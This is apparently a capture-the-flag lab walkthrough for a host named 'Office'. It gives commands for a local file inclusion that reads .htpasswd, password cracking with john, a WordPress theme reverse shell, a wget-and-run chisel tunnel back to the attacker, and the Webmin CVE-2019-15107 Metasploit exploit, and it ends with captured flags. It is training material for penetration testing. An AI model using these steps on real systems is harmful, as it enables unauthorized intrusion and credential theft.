# Office

**IP Address:** 172.31.3.1

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 443/tcp | open | http | Apache httpd 2.4.29 |
| 80/tcp | open | http | Apache httpd 2.4.29 |

## Exploitation
### Exploit Details (LFI)
* **Name** - LFI
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. The subdomain forum.office.csl contains a local file inclusion vulnerability which we can exploit to read credentials.

Commands
```
curl 'http://forum.office.csl/chatlogs/chatlogs.php?file=/var/www/html/forum/.htpasswd'
```

![Execute Exploit](images/exploit1.png)

2. We can now crack the credentials using john. 

Commands
```
echo '$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/' > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit2.png)

3. Using the credentials we can login to the wordpress site and upload a reverse shell by editing the TwentyNineteen theme. 

![Execute Exploit](images/exploit3.png)

4. Initiate the reverse shell. 

Commands
```
curl "http://office.csl/wp-content/themes/twentynineteen/404.php"
```

![Execute Exploit](images/exploit4.png)

5. Then elevate to the dwight user. 

Commands
```
sudo -u dwight /bin/bash
whoami
cat /home/dwight/access.txt
```

![Execute Exploit](images/exploit5.png)

## Privilege Escalation
### Exploit Details (Metasploit)
* **Name** - Webmin password_change.cgi Backdoor
* **CVE** - 2019-15107
* **Module** - exploit/linux/http/webmin_backdoor
* **Disclosed** - 2019-08-10
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2019-15107                 
  * http://www.webmin.com/exploit.html                    
  * https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html
  * https://blog.firosolutions.com/exploits/webmin/          
  * https://github.com/webmin/webmin/issues/947

1. Setup chisel on the Kali host. 

Commands
```
chisel server -p 9050 --reverse
```

![Execute Exploit](images/privesc1.png)

2. On the target host download and run the chisel client. 

Commands
```
wget http://$lhost/chisel
chmod 777 chisel
./chisel client 10.10.0.37:9050 R:10000:127.0.0.1:10000
```

![Execute Exploit](images/privesc2.png)

3. Set the metasploit options

Commands
```
show options
```

![Execute Exploit](images/privesc3.png)

4. Run the exploit. 

Commands
```bash
run
whoami
cat /root/system.txt
```

![Execute Exploit](images/privesc4.png)

## Loot
```
access.txt
57c2cf33a9ccd059141afd8ad2a35519
system.txt
39bd97013feb7508923ed8ace6fe6130
```